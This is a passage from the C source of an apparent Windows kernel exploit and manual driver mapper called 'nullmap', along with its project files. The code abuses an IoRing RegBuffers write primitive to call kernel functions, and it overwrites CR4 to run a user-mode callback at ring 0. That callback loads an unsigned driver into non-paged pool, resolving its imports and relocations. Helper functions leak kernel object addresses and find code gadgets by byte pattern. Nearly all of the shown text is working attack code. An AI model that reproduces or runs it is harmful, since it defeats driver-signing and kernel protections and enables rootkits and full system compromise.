	ConsoleInfo("Writing into IoRing->RegBuffers...");
	status = ExploitWrite0x1((char*)&ioRingObject->RegBuffers + 0x3);
	if (!status)
	{
		ConsoleError("Failed to write!");
		return -1;
	}

	status = ExploitWrite0x1((char*)&ioRingObject->RegBuffersCount);
	if (!status)
	{
		ConsoleError("Failed to write!");
		return -1;
	}

	ConsoleSuccess("Write successful");

	ConsoleInfo("Changing cr4...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)gadgetKernelAddress, 0x00000000000506F8, 0x0);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		return -1;
	}

	ConsoleInfo("Calling mapper itself...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)jumpKernelAddress, 0x0, (PVOID)KernelCallback);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		return -1;
	}

	ConsoleInfo("Checking kernel callback...");
	if (!kernelCallbackCalled)
	{
		ConsoleError("Callback function was not called, exploit was unsuccessful!");
		IoRingRundown();
		return -1;
	}

	ConsoleSuccess("Callback called");

	ConsoleInfo("Checking status...");
	if (mapStatus == STATUS_SUCCESS)
	{
		ConsoleSuccess("Driver was mapped successfully!");
		ConsoleSuccess("Driver status: 0x%p", driverStatus);
	}
	else
	{
		ConsoleError("Failed driver map: 0x%p", mapStatus);
	}

	ConsoleInfo("Restoring cr4...");
	status = CallKernelFunction(pointerKernelAddress, (PVOID)gadgetKernelAddress, 0x00000000001506F8, 0x0);
	if (!status)
	{
		ConsoleError("Failed to call function!");
		IoRingRundown();
		return -1;
	}

	IoRingRundown();
	ConsoleSuccess("Everything successful");
	return 0;
}
```

`nullmap/nullmap/mapper.c`:

```c
#include "general.h"

BOOL kernelCallbackCalled = FALSE;
NTSTATUS mapStatus = STATUS_UNSUCCESSFUL;
NTSTATUS driverStatus = 0xDEAD;

PVOID kernelBase;
PVOID driverBuffer;

// MSVC sometimes randomly decides to use winapi import
// and sometimes it just inlines it so let's just write
// it like this
__forceinline int CustomCompare(const char* a, const char* b)
{
	while (*a && *a == *b) { ++a; ++b; }
	return (int)(unsigned char)(*a) - (int)(unsigned char)(*b);
}

__forceinline void CustomCopy(void* dest, void* src, size_t n)
{
	char* csrc = (char*)src;
	char* cdest = (char*)dest;

	for (int i = 0; i < n; i++)
		cdest[i] = csrc[i];
}

DWORD64 ResolveExport(PVOID imageBase, const char* functionName)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)imageBase + dosHeader->e_lfanew);

	DWORD exportBase = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportBaseSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!exportBase || !exportBaseSize)
		return 0;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)imageBase + exportBase);

	DWORD64 delta = (DWORD64)imageExportDirectory - exportBase;

	DWORD* nameTable = (DWORD*)(imageExportDirectory->AddressOfNames + delta);
	WORD* ordinalTable = (WORD*)(imageExportDirectory->AddressOfNameOrdinals + delta);
	DWORD* functionTable = (DWORD*)(imageExportDirectory->AddressOfFunctions + delta);

	for (DWORD i = 0u; i < imageExportDirectory->NumberOfNames; ++i)
	{
		const char* currentFunctionName = (const char*)(nameTable[i] + delta);

		if (CustomCompare(currentFunctionName, functionName) == 0)
		{
			WORD functionOrdinal = ordinalTable[i];
			if (functionTable[functionOrdinal] <= 0x1000)
				return 0;

			DWORD64 functionAddress = (DWORD64)kernelBase + functionTable[functionOrdinal];

			if (functionAddress >= (DWORD64)kernelBase + exportBase && functionAddress <= (DWORD64)kernelBase + exportBase + exportBaseSize)
				return 0;

			return functionAddress;
		}
	}

	return 0;
}

void KernelCallback(void* first, void* second)
{
	// WARNING
	// this function is being executed with CPL 0

	UNREFERENCED_PARAMETER(first);
	UNREFERENCED_PARAMETER(second);

	kernelCallbackCalled = TRUE;

	ExAllocatePool_t ExAllocatePool = (ExAllocatePool_t)ResolveExport(kernelBase, "ExAllocatePool");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)driverBuffer;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)driverBuffer + dosHeader->e_lfanew);

	DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;

	PVOID imageBuffer = ExAllocatePool(NonPagedPool, imageSize);
	if (!imageBuffer)
	{
		mapStatus = STATUS_INSUFFICIENT_RESOURCES;
		return;
	}

	CustomCopy(imageBuffer, driverBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

	// rightfully stolen from
	// https://github.com/btbd/umap/blob/master/mapper/main.c#L61
	PIMAGE_SECTION_HEADER currentImageSection = IMAGE_FIRST_SECTION(ntHeaders);
	for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
	{
		if ((currentImageSection[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
			continue;

		PVOID localSection = (PVOID)((DWORD64)imageBuffer + currentImageSection[i].VirtualAddress);
		CustomCopy(localSection, (PVOID)((DWORD64)driverBuffer + currentImageSection[i].PointerToRawData), currentImageSection[i].SizeOfRawData);
	}

	ULONG importsRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (!importsRva)
	{
		mapStatus = STATUS_INVALID_PARAMETER_1;
		return;
	}

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)imageBuffer + importsRva);
	for (; importDescriptor->FirstThunk; ++importDescriptor)
	{
		PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)((DWORD64)imageBuffer + importDescriptor->FirstThunk);
		PIMAGE_THUNK_DATA64 thunkOriginal = (PIMAGE_THUNK_DATA64)((DWORD64)imageBuffer + importDescriptor->OriginalFirstThunk);

		for (; thunk->u1.AddressOfData; ++thunk, ++thunkOriginal)
		{
			PCHAR importName = ((PIMAGE_IMPORT_BY_NAME)((DWORD64)imageBuffer + thunkOriginal->u1.AddressOfData))->Name;
			ULONG64 import = ResolveExport(kernelBase, importName);
			if (!import)
			{
				mapStatus = STATUS_NOT_FOUND;
				return;
			}

			thunk->u1.Function = import;
		}
	}

	PIMAGE_DATA_DIRECTORY baseRelocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (baseRelocDir->VirtualAddress)
	{
		PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((DWORD64)imageBuffer + baseRelocDir->VirtualAddress);
		for (UINT32 currentSize = 0; currentSize < baseRelocDir->Size; )
		{
			ULONG relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			PUSHORT relocData = (PUSHORT)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
			PBYTE relocBase = (PBYTE)((DWORD64)imageBuffer + reloc->VirtualAddress);

			for (UINT32 i = 0; i < relocCount; ++i, ++relocData)
			{
				USHORT data = *relocData;
				USHORT type = data >> 12;
				USHORT offset = data & 0xFFF;

				switch (type)
				{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_DIR64:
				{
					PULONG64 rva = (PULONG64)(relocBase + offset);
					*rva = (ULONG64)((DWORD64)imageBuffer + (*rva - ntHeaders->OptionalHeader.ImageBase));
					break;
				}
				default:
					mapStatus = STATUS_NOT_SUPPORTED;
					return;
				}
			}

			currentSize += reloc->SizeOfBlock;
			reloc = (PIMAGE_BASE_RELOCATION)relocData;
		}
	}

	driverStatus = ((PDRIVER_INITIALIZE)((DWORD64)imageBuffer + ntHeaders->OptionalHeader.AddressOfEntryPoint))((PVOID)0xDEAD, (PVOID)0xFEED);
	mapStatus = STATUS_SUCCESS;
}
```

`nullmap/nullmap/mapper.h`:

```h
#pragma once

// ntstatus.h exists I know but then it throws billion
// redefinition warnings
#define STATUS_UNSUCCESSFUL              ((NTSTATUS)0xC0000001L)
#define STATUS_INSUFFICIENT_RESOURCES    ((NTSTATUS)0xC000009AL)
#define STATUS_INVALID_PARAMETER_1       ((NTSTATUS)0xC00000EFL)
#define STATUS_INVALID_PARAMETER_2       ((NTSTATUS)0xC00000F0L)
#define STATUS_INVALID_PARAMETER_3       ((NTSTATUS)0xC00000F1L)
#define STATUS_NOT_FOUND                 ((NTSTATUS)0xC0000225L)
#define STATUS_NOT_SUPPORTED             ((NTSTATUS)0xC00000BBL)

extern BOOL kernelCallbackCalled;
extern PVOID driverBuffer;
extern PVOID kernelBase;

extern NTSTATUS mapStatus;
extern NTSTATUS driverStatus;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	NonPagedPoolExecute = NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed = NonPagedPool + 2,
	DontUseThisType,
	NonPagedPoolCacheAligned = NonPagedPool + 4,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
	MaxPoolType,
	NonPagedPoolBase = 0,
	NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
	NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
	NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
	NonPagedPoolSession = 32,
	PagedPoolSession = NonPagedPoolSession + 1,
	NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
	DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
	NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
	PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
	NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
	NonPagedPoolNx = 512,
	NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
	NonPagedPoolSessionNx = NonPagedPoolNx + 32,
} POOL_TYPE;

typedef PVOID(*ExAllocatePool_t)(POOL_TYPE type, SIZE_T numberOfBytes);

typedef NTSTATUS(NTAPI DRIVER_INITIALIZE)(void* dummy1, void* dummy2);
typedef DRIVER_INITIALIZE* PDRIVER_INITIALIZE;

int CustomCompare(const char* a, const char* b);
DWORD64 ResolveExport(PVOID imageBase, const char* functionName);
void KernelCallback(void* first, void* second);
```

`nullmap/nullmap/nullmap.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{5a03ed1b-560f-477b-8c26-dfecf71cab4f}</ProjectGuid>
    <RootNamespace>nullmap</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <UseOfMfc>Static</UseOfMfc>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>true</TreatWarningAsError>
      <DisableSpecificWarnings>4005;4022;%(DisableSpecificWarnings)</DisableSpecificWarnings>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>ntdll.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="console.c" />
    <ClCompile Include="exploit.c" />
    <ClCompile Include="ioring.c" />
    <ClCompile Include="main.c" />
    <ClCompile Include="mapper.c" />
    <ClCompile Include="utils.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="console.h" />
    <ClInclude Include="exploit.h" />
    <ClInclude Include="general.h" />
    <ClInclude Include="ioring.h" />
    <ClInclude Include="mapper.h" />
    <ClInclude Include="utils.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`nullmap/nullmap/nullmap.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="console.c">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="main.c">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="mapper.c">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="utils.c">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="ioring.c">
      <Filter>Source</Filter>
    </ClCompile>
    <ClCompile Include="exploit.c">
      <Filter>Source</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="console.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="general.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="mapper.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="ioring.h">
      <Filter>Source</Filter>
    </ClInclude>
    <ClInclude Include="exploit.h">
      <Filter>Source</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`nullmap/nullmap/utils.c`:

```c
#include "general.h"

PVOID UtilsReadFile(const char* path, SIZE_T* fileSize)
{
	HANDLE fileHandle = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE)
		return NULL;

	LARGE_INTEGER size;
	BOOL status = GetFileSizeEx(fileHandle, &size);
	if (!status)
	{
		CloseHandle(fileHandle);
		return NULL;
	}

	PVOID buffer = malloc(size.QuadPart);
	if (!buffer)
	{
		CloseHandle(fileHandle);
		return NULL;
	}

	DWORD bytesRead;
	status = ReadFile(fileHandle, buffer, size.LowPart, &bytesRead, NULL);
	if (!status)
	{
		CloseHandle(fileHandle);
		free(buffer);
		return NULL;
	}

	CloseHandle(fileHandle);
	*fileSize = size.QuadPart;
	return buffer;
}

PIMAGE_NT_HEADERS64 UtilsGetImageHeaders(PVOID imageStart, SIZE_T maximumSize)
{
	if (maximumSize < sizeof(IMAGE_DOS_HEADER))
		return NULL;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageStart;

	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)imageStart + dosHeader->e_lfanew);

	if ((DWORD64)ntHeaders > (DWORD64)imageStart + maximumSize + sizeof(IMAGE_NT_HEADERS64))
		return NULL;

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return ntHeaders;
}

char* UtilsCompare(const char* haystack, const char* needle)
{
	do
	{
		const char* h = haystack;
		const char* n = needle;
		while (tolower(*h) == tolower(*n) && *n)
		{
			h++;
			n++;
		}

		if (*n == 0)
			return (char*)haystack;
	} while (*haystack++);
	return NULL;
}

extern NTSTATUS WINAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);

PVOID UtilsGetModuleBase(const char* moduleName)
{
	PVOID address = NULL;
	ULONG size = 0;

	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &size, 0, &size);
	if (status != STATUS_INFO_LENGTH_MISMATCH)
		return NULL;

	PSYSTEM_MODULE_INFORMATION moduleList = (PSYSTEM_MODULE_INFORMATION)malloc(size);
	if (!moduleList)
		return NULL;

	status = NtQuerySystemInformation(SystemModuleInformation, moduleList, size, NULL);
	if (!NT_SUCCESS(status))
		goto end;

	for (ULONG_PTR i = 0; i < moduleList->ulModuleCount; i++)
	{
		DWORD64 pointer = (DWORD64)&moduleList->Modules[i];
		pointer += sizeof(SYSTEM_MODULE);
		if (pointer > ((DWORD64)moduleList + size))
			break;

		SYSTEM_MODULE module = moduleList->Modules[i];
		module.ImageName[255] = '\0';
		if (UtilsCompare(module.ImageName, moduleName))
		{
			address = module.Base;
			break;
		}
	}

end:
	free(moduleList);
	return address;
}

#define IN_RANGE(x, a, b) (x >= a && x <= b)
#define GET_BITS(x) (IN_RANGE((x&(~0x20)),'A','F')?((x&(~0x20))-'A'+0xA):(IN_RANGE(x,'0','9')?x-'0':0))
#define GET_BYTE(a, b) (GET_BITS(a) << 4 | GET_BITS(b))
DWORD64 UtilsFindPattern(void* baseAddress, DWORD64 size, const char* pattern)
{
	BYTE* firstMatch = NULL;
	const char* currentPattern = pattern;

	BYTE* start = (BYTE*)baseAddress;
	BYTE* end = start + size;

	for (BYTE* current = start; current < end; current++)
	{
		BYTE byte = currentPattern[0];
		if (!byte)
			return (DWORD64)firstMatch;
		if (byte == '\?' || *(BYTE*)current == GET_BYTE(byte, currentPattern[1]))
		{
			if (!firstMatch) firstMatch = current;
			if (!currentPattern[2])
				return (DWORD64)firstMatch;
			((byte == '\?') ? (currentPattern += 2) : (currentPattern += 3));
		}
		else
		{
			currentPattern = pattern;
			firstMatch = NULL;
		}
	}

	return 0;
}

DWORD64 UtilsFindPatternImage(void* base, const char* pattern)
{
	DWORD64 match = 0;

	PIMAGE_NT_HEADERS64 headers = (PIMAGE_NT_HEADERS64)((DWORD64)base + ((PIMAGE_DOS_HEADER)(base))->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (USHORT i = 0; i < headers->FileHeader.NumberOfSections; ++i)
	{
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, ".text", 5) == 0 || *(DWORD32*)section->Name == 'EGAP')
		{
			match = UtilsFindPattern((void*)((DWORD64)base + section->VirtualAddress), section->Misc.VirtualSize, pattern);
			if (match)
				break;
		}
	}

	return match;
}

BOOL UtilsGetObjectPointer(ULONG processId, HANDLE targetHandle, PULONG64 objectPointer)
{
	PSYSTEM_HANDLE_INFORMATION handleInformation = NULL;
	ULONG queryBytes = 0;
	NTSTATUS status;
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInformation, queryBytes, &queryBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleInformation != NULL)
		{
			handleInformation = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInformation, 2 * queryBytes);
		}

		else
		{
			handleInformation = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * queryBytes);
		}
	}

	if (status != STATUS_SUCCESS)
		return FALSE;

	for (ULONG i = 0; i < handleInformation->NumberOfHandles; i++)
	{
		if ((handleInformation->Handles[i].UniqueProcessId == processId) && (handleInformation->Handles[i].HandleValue == (unsigned short)targetHandle))
		{
			*objectPointer = (ULONG64)handleInformation->Handles[i].Object;
			return TRUE;
		}
	}

	return FALSE;
}
```

`nullmap/nullmap/utils.h`:

```h
#pragma once

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemInformationClassMin = 0,
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemNotImplemented1 = 4,
	SystemProcessInformation = 5,
	SystemProcessesAndThreadsInformation = 5,
	SystemCallCountInfoInformation = 6,
	SystemCallCounts = 6,
	SystemDeviceInformation = 7,
	SystemConfigurationInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemProcessorTimes = 8,
	SystemFlagsInformation = 9,
	SystemGlobalFlag = 9,
	SystemCallTimeInformation = 10,
	SystemNotImplemented2 = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemLockInformation = 12,
	SystemStackTraceInformation = 13,
	SystemNotImplemented3 = 13,
	SystemPagedPoolInformation = 14,
	SystemNotImplemented4 = 14,
	SystemNonPagedPoolInformation = 15,
	SystemNotImplemented5 = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemPagefileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemInstructionEmulationCounts = 19,
	SystemVdmBopInformation = 20,
	SystemInvalidInfoClass1 = 20,
	SystemFileCacheInformation = 21,
	SystemCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemProcessorStatistics = 23,
	SystemDpcBehaviourInformation = 24,
	SystemDpcInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemNotImplemented6 = 25,
	SystemLoadImage = 26,
	SystemUnloadImage = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemTimeAdjustment = 28,
	SystemSummaryMemoryInformation = 29,
	SystemNotImplemented7 = 29,
	SystemNextEventIdInformation = 30,
	SystemNotImplemented8 = 30,
	SystemEventIdsInformation = 31,
	SystemNotImplemented9 = 31,
	SystemCrashDumpInformation = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemLoadAndCallImage = 38,
	SystemPrioritySeparation = 39,
	SystemPlugPlayBusInformation = 40,
	SystemNotImplemented10 = 40,
	SystemDockInformation = 41,
	SystemNotImplemented11 = 41,
	SystemInvalidInfoClass2 = 42,
	SystemProcessorSpeedInformation = 43,
	SystemInvalidInfoClass3 = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemSetTimeSlipEvent = 46,
	SystemCreateSession = 47,
	SystemDeleteSession = 48,
	SystemInvalidInfoClass4 = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemAddVerifier = 52,
	SystemSessionProcessesInformation = 53,
	SystemInformationClassMax
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE
{
	ULONG_PTR Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG_PTR ulModuleCount;
	SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define RELATIVE_ADDRESS(address, size) ((VOID *)((UINT8 *)(address) + *(INT32 *)((UINT8 *)(address) + ((size) - (INT32)sizeof(INT32))) + (size)))
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)

PVOID UtilsReadFile(const char* path, SIZE_T* fileSize);
PIMAGE_NT_HEADERS64 UtilsGetImageHeaders(PVOID imageStart, SIZE_T maximumSize);
char* UtilsCompare(const char* haystack, const char* needle);
PVOID UtilsGetModuleBase(const char* moduleName);
DWORD64 UtilsFindPattern(void* baseAddress, DWORD64 size, const char* pattern);
DWORD64 UtilsFindPatternImage(void* base, const char* pattern);
BOOL UtilsGetObjectPointer(ULONG processId, HANDLE targetHandle, PULONG64 objectPointer);

```